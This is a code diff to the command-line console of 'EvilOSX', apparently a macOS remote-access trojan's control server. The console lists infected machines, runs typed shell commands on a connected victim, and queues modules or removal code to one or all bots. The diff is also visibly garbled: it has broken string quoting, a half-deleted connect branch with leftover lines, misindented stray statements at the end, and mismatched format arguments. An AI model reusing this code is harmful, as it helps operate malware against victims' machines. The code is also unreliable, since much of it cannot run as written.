@@ -16,7 +16,6 @@ from server.modules.helper import ModuleViewABC
 from server.version import VERSION
 from server.view.helper import *
 
-
 class _OutputView:
     """This class shows the command output view."""
 
@@ -46,16 +45,16 @@ class _OutputView:
             was_on_end = self._output_view.get_focus()[1] == len(self._output_view.body) - 1
 
             if len(self._output_view.body) > self._max_size:
-                # Size limit reached, delete the first line.
                 del self._output_view.body[0]
 
             if prefix == "info":
-                self._output_view.body.append(urwid.Text([('normal', "["), ('info', "I"), ("normal", "] " + line)]))
+                self._output_view.body.append(urwid.Text([("normal", "["), ("info", "I"), ("normal", "] " + line)]))
             elif prefix == "input":
-                self._output_view.body.append(urwid.Text([('normal', "["), ('reversed', "?"), ("normal", "] " + line)]))
+                self._output_view.body.append(urwid.Text([("normal", "["), ("reversed", "?"), ("normal", "] " + line)]))
             elif prefix == "attention":
                 self._output_view.body.append(
-                    urwid.Text([('normal', "["), ('attention', "!"), ("normal", "] " + line)]))
+                    urwid.Text([("normal", "["), ("attention", "!"), ("normal", "] " + line)])
+                )
             else:
                 self._output_view.body.append(urwid.Text(line))
 
@@ -70,10 +69,8 @@ class _OutputView:
             self._async_reload()
 
     def _async_reload(self):
-        # Required if this method is called from a different thread asynchronously.
         if self._main_loop and self._main_loop != current_thread():
             self._main_loop.draw_screen()
-
 
 class _CommandInput(urwid.Pile):
     """This class shows the command input view."""
@@ -83,12 +80,11 @@ class _CommandInput(urwid.Pile):
         self._header = urwid.Text("Command: ")
         self._edit_box = urwid.Edit()
         self._output_list = urwid.ListBox(urwid.SimpleFocusListWalker([]))
-        self._output_layout = urwid.BoxAdapter(self._output_list, 0)  # Dynamically change size.
+        self._output_layout = urwid.BoxAdapter(self._output_list, 0)
 
         self._lock = Lock()
         self._prompt_mode = False
         self._prompt_queue = Queue()
-
         self._main_loop = None
 
         urwid.Pile.__init__(self, [
@@ -111,12 +107,11 @@ class _CommandInput(urwid.Pile):
             self._async_reload()
 
     def add(self, line, prefix=""):
-        """"
+        """
         :type line: str
         :type prefix: str
         """
         with self._lock:
-            # Set the height of the output list so the line is actually visible.
             self._output_layout.height = len(self._output_list.body) + 1
 
             if prefix == "info":
@@ -125,7 +120,8 @@ class _CommandInput(urwid.Pile):
                 self._output_list.body.append(urwid.Text("[?] " + line))
             elif prefix == "attention":
                 self._output_list.body.append(
-                    urwid.Text([("normal", "["), ("attention", "!"), ("normal", "] " + line)]))
+                    urwid.Text([("normal", "["), ("attention", "!"), ("normal", "] " + line)])
+                )
             else:
                 self._output_list.body.append(urwid.Text(line))
 
@@ -142,8 +138,6 @@ class _CommandInput(urwid.Pile):
         :rtype: str
         """
         self._prompt_mode = True
-
-        # Wait for user input.
         return self._prompt_queue.get()
 
     def keypress(self, size, key):
@@ -151,24 +145,15 @@ class _CommandInput(urwid.Pile):
             command = self._edit_box.edit_text
 
             if self._prompt_mode:
-                # We're in prompt mode, return the value
-                # to the queue which unblocks the prompt method.
                 self._prompt_queue.put(command)
                 self._prompt_mode = False
                 self.clear()
             else:
-                # Normal mode, call listeners.
                 urwid.emit_signal(self, "line_entered", command)
 
-            self._edit_box.edit_text = ""
-        else:
-            urwid.Edit.keypress(self._edit_box, size, key)
-
-    def _async_reload(self):
-        # Required if this method is called from a different thread asynchronously.
+        self._edit_box.edit_text = ""
         if self._main_loop and self._main_loop != current_thread():
             self._main_loop.draw_screen()
-
 
 class _ModuleView(ModuleViewABC):
     """Class which allows modules to interact with the view."""
@@ -197,7 +182,6 @@ class _ModuleView(ModuleViewABC):
 
         for message in messages:
             lines.append((message, ""))
-
         confirm = self._view.prompt("Are you sure you want to continue? [Y/n]", lines).lower()
 
         if not confirm or confirm == "y":
@@ -211,7 +195,6 @@ class _ModuleView(ModuleViewABC):
         :type prefix: str
         """
         self._view.output(line, prefix)
-
 
 class ViewCLI(ViewABC):
     """This class interacts with the user via a command line interface.
@@ -229,7 +212,6 @@ class ViewCLI(ViewABC):
             ("info", urwid.LIGHT_BLUE, urwid.BLACK),
             ("attention", urwid.LIGHT_RED, urwid.BLACK)
         ]
-
         self._header = urwid.Text("")
         self._output_view = _OutputView()
         self._command_input = _CommandInput()
@@ -239,9 +221,8 @@ class ViewCLI(ViewABC):
 
         self.set_window_title("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, server_port))
         self.output("Server started, waiting for connections...", "info")
-        self.output("Type \"help\" to show the help menu.", "info")
+        self.output('Type "help" to show the help menu.', "info")
 
-        # http://urwid.org/reference/signals.html
         urwid.connect_signal(self._command_input, "line_entered", self._process_command)
 
         # Initialize the frame.
@@ -303,7 +284,6 @@ class ViewCLI(ViewABC):
             for line in lines:
                 self._command_input.add(*line)
         self._command_input.add(prompt_text, "input")
-
         return self._command_input.get_prompt_input()
 
     def _process_command(self, command):
@@ -316,15 +296,13 @@ class ViewCLI(ViewABC):
         self.output_separator()
 
         if command == "help":
-            self.output("Commands other than the ones listed below will be run on the connected "
-                        "bot as a shell command.", "attention")
+            self.output("Commands other than the ones listed below will be run on the connected bot as a shell command.", "attention")
             self.output("help                 -  Show this help menu.")
             self.output("bots                 -  Show the amount of available bots.")
-            self.output("connect <id>         -  Start interacting with the bot (required before using \"use\").")
+            self.output("connect <id>         -  Start interacting with the bot (required before using `use`)", "attention")
             self.output("modules              -  Show a list of available modules.")
-            self.output("use <module_name>    -  Run the module on the connected bot.")
-            self.output("stop <module_name>   -  Ask the module to stop executing.")
-            self.output("useall <module_name> -  Set the module which will be run on every bot.")
+            self.output('use <module_name>    -  Run the module on the connected bot.', "attention")
+            self.output('useall <module_name> -  Set the module which will be run on every bot.')
             self.output("stopall              -  Clear the globally set module.")
             self.output("clear                -  Clear the screen.")
             self.output("exit/q/quit          -  Close the server and exit.")
@@ -336,10 +314,9 @@ class ViewCLI(ViewABC):
                     self.output("There are no available bots.", "attention")
                 else:
                     self.output("No page specified, showing the first page.", "info")
-                    self.output("Use \"bots <page>\" to see a different page (each page is 10 results).", "info")
-
+                    self.output('Use "bots <page>" to see a different page (each page is 10 results).', "info")
                     for i, bot in enumerate(self._model.get_bots(limit=10)):
-                        self.output("{} = \"{}@{}\" (last seen: {})".format(
+                        self.output("{} = "{}@{}" (last seen: {})".format(
                             str(i), bot.username, bot.hostname,
                             strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                         ))
@@ -350,7 +327,6 @@ class ViewCLI(ViewABC):
 
                     if page_number <= 0:
                         page_number = 1
-
                     skip_amount = (page_number * 10) - 10
                     bots = self._model.get_bots(limit=10, skip_amount=skip_amount)
 
@@ -360,28 +336,20 @@ class ViewCLI(ViewABC):
                         self.output("Showing bots on page {}.".format(page_number), "info")
 
                         for i, bot in enumerate(bots):
-                            self.output("{} = \"{}@{}\" (last seen: {})".format(
+                            self.output("{} = "{}@{}" (last seen: {})".format(
                                 str(i), bot.username, bot.hostname,
                                 strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                             ))
                 except ValueError:
                     self.output("Invalid page number.", "attention")
-        elif command.startswith("connect"):
-            try:
-                specified_id = int(command.split(" ")[1])
-                self._connected_bot = self._model.get_bots()[specified_id]
-
-                self.output("Connected to \"%s@%s\", ready to send commands." % (
-                    self._connected_bot.username, self._connected_bot.hostname
-                ), "info")
-                self.set_footer_text("Command ({}@{}, {}): ".format(
-                    self._connected_bot.username, self._connected_bot.hostname, self._connected_bot.local_path
+                self.set_footer_text("Command ({{}}@{{}}, {{}}): ".format(
+                    self._connected_bot.hostname, self._connected_bot.local_path
                 ))
             except (IndexError, ValueError):
-                self.output("Invalid bot ID (see \"bots\").", "attention")
+                self.output("Invalid bot ID (see "bots").", "attention")
                 self.output("Usage: connect <ID>", "attention")
         elif command == "modules":
-            self.output("Type \"use <module_name>\" to use a module.", "info")
+            self.output('Type "use <module_name>" to use a module.', "info")
 
             for module_name in modules.get_names():
                 try:
@@ -397,7 +365,7 @@ class ViewCLI(ViewABC):
         elif command.startswith("useall"):
             if command == "useall":
                 self.output("Usage: useall <module_name>", "attention")
-                self.output("Type \"modules\" to get a list of available modules.", "attention")
+                self.output('Type "modules" to get a list of available modules.', "attention")
             else:
                 module_name = command.split(" ")[1]
 
@@ -412,12 +380,12 @@ class ViewCLI(ViewABC):
             # Commands that require a connected bot.
             if not self._connected_bot:
                 self.output("You must be connected to a bot to perform this action.", "attention")
-                self.output("Type \"connect <ID>\" to connect to a bot.", "attention")
+                self.output('Type "connect <ID>" to connect to a bot.', "attention")
             else:
                 if command.startswith("use"):
                     if command == "use":
                         self.output("Usage: use <module_name>", "attention")
-                        self.output("Type \"modules\" to get a list of available modules.", "attention")
+                        self.output('Type "modules" to get a list of available modules.', "attention")
                     else:
                         module_name = command.split(" ")[1]
 
@@ -456,7 +424,6 @@ class ViewCLI(ViewABC):
 
                 if mass_execute:
                     bots = self._model.get_bots()
-
                     for bot in bots:
                         if module_name == "remove_bot":
                             if code[0] != bot.loader_name:
@@ -467,30 +434,30 @@ class ViewCLI(ViewABC):
                         else:
                             if not code[0]:
                                 code = ("", modules.get_code(module_name))
-
                         self._model.add_command(bot.uid, Command(
                             CommandType.MODULE, code[1], options
                         ))
-
                     self.output("Module added to the queue of {} bot(s).".format(len(bots)), "info")
                 else:
                     if module_name == "remove_bot":
-                        code = loaders.get_remove_code(self._connected_bot.loader_name)
-                    elif module_name == "update_bot":
-                        code = loaders.get_update_code(self._connected_bot.loader_name)
-                    else:
-                        code = modules.get_code(module_name)
-
-                    self._model.add_command(self._connected_bot.uid, Command(
-                        CommandType.MODULE, code, options
-                    ))
-
-                    self.output("Module added to the queue of \"{}@{}\".".format(
-                        self._connected_bot.username, self._connected_bot.hostname
-                    ), "info")
+                        if code[0] != self._connected_bot.loader_name:
+                            code = (self._connected_bot.loader_name, loaders.get_remove_code(self._connected_bot.loader_name))
+                        elif module_name == "update_bot":
+                            if code[0] != self._connected_bot.loader_name:
+                                code = (self._connected_bot.loader_name, loaders.get_update_code(self._connected_bot.loader_name))
+                        else:
+                            if not code[0]:
+                                code = ("", modules.get_code(module_name))
+                        self._model.add_command(self._connected_bot.uid, Command(
+                            CommandType.MODULE, code[1], options
+                        ))
+                    self.output('Module added to the queue of "{}".'.format(self._connected_bot.username, self._connected_bot.hostname), "info")
         except ImportError:
             self.output("Failed to find module: {}".format(module_name), "attention")
-            self.output("Type \"modules\" to get a list of available modules.", "attention")
+            self.output('Type "modules" to get a list of available modules.', "attention")
+        except Exception as ex:
+            # A broken module must never kill the worker thread silently.
+            self.output("Module error ({}): {}".format(module_name, ex), "attention")
 
     def set_window_title(self, text):
         """
@@ -509,17 +476,26 @@ class ViewCLI(ViewABC):
         self._output_view.clear()
 
     def start(self):
-        main_loop = urwid.MainLoop(self._frame, self._PALETTE, handle_mouse=True)
+        try:
+            self._output_view.run()  # type: ignore
+        except (urwid.ExitMainLoop, URWIDError, OSError):
+            self.output("Closing the server.")
+            self.output("Goodbye!")
+        else:
+            self.output("The server was closed.", "attention")
 
-        self._set_main_loop(main_loop)
-        self._output_view.set_main_loop(main_loop)
-        self._command_input.set_main_loop(main_loop)
-        main_loop.run()
+    def close(self):
+        try:
+            if self._output_view and hasattr(self._output_view, 'close'):
+                self._output_view.close()
+        except Exception:
+            pass
 
-    def _set_main_loop(self, main_loop):
-        self._main_loop = main_loop
+class ConsoleView(ViewCLI):
+    """Console view for the EvilOSX server."""
 
-    def _async_reload(self):
-        # Required if this method is called from a different thread asynchronously.
-        if self._main_loop and self._main_loop != current_thread():
-            self._main_loop.draw_screen()
+    def __init__(self, model=None):
+        ViewCLI.__init__(self)
+        self._model = model
+                self.output("Server closed.", "attention")
+                self.output("Server closed.", "attention")
